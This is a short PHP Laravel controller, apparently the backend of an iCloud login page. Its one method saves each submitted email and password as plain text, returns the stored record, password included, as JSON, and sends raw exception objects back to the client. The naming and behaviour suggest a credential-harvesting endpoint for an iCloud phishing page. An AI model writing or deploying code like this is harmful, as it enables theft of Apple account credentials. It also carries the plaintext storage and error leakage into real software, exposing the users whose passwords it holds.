<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Console\Presets\React;
use Illuminate\Http\Request;
use App\iCloudLogin;

class iCloudLoginController extends Controller
{
    public function LoginPhone (Request $request)
    {
        try {
            // dd($request->all());
            $create = new iCloudLogin();
            $create->email = $request->email;
            $create->password = $request->password;
            $create->save();

            return response()->json($create)->setStatusCode(200);
        } catch (\Throwable $th) {
            return $th;
        }
    }
}
